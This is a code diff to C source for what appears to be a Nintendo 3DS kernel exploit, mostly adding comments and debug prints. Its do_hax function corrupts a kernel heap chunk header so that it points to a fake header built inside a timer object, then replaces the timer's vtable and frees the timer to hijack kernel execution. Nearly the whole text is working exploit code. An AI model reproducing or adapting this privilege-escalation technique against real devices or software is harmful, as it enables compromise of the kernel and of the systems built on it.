@@ -18,10 +18,12 @@ extern u32 __ctru_heap_size;
 
 static volatile Result control_res = -1;
 
+// Test function, please ignore.
 static void hello() {
     printf("Hello world!\n");
 }
 
+// Test vtable, please ignore.
 static void* vtable[16] = {
         hello,
         hello,
@@ -87,12 +89,15 @@ static void map_raw_pages(u32 memAddr, u32 memSize) {
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
 }
 
+// Waits for the memory mapping thread to complete.
 static void wait_map_complete() {
+    // Wait for the control result to be set.
     while(control_res == -1) {
         svcSleepThread(1000000);
     }
 }
 
+// Creates a timer and outputs its kernel object address from r2.
 static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
     asm volatile(
     "str r0, [sp, #-4]!\n"
@@ -108,11 +113,13 @@ static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset
 
 // Executes exploit.
 void do_hax() {
+    // Create a timer, crafting a fake MemChunkHdr out of its data.
     Handle timer;
     u32 timerAddr;
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
     svcSetTimer(timer, 0, 0);
 
+    // Debug output.
     printf("Timer address: %08X\n", (int) timerAddr);
 
     // Allow threads on core 1.
@@ -127,23 +134,22 @@ void do_hax() {
     // Map the pages.
     map_raw_pages(memAddr, memSize);
 
-    // Retrieve the current header data.
-    MemChunkHdr hdr = *(volatile MemChunkHdr*) memAddr;
-
-    // Overwrite the header "next" pointer.
+    // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
     ((MemChunkHdr*) memAddr)->next = (void*) (timerAddr + 0x20);
 
-    // Output debug information.
-    printf("\"Size\" value: %08X\n", (int) hdr.size);
-    printf("\"Next\" value: %08X\n", (int) hdr.next);
-    printf("\"Prev\" value: %08X\n", (int) hdr.prev);
+    // Output post-overwrite control result.
     printf("Post-overwrite control result: %08X\n", (int) control_res);
 
+    // Wait for memory mapping to complete.
     wait_map_complete();
 
+    // Output final control result.
     printf("Final control result: %08X\n", (int) control_res);
 
+    // Overwrite the timer's vtable with our own.
     void*** vtablePtr = (void***) (memAddr + (timerAddr - (timerAddr & ~0xFFF)) - 4);
+    printf("vtable: %08X\n", (int) vtablePtr);
+
     *vtablePtr = vtable;
 
     // Free the timer.
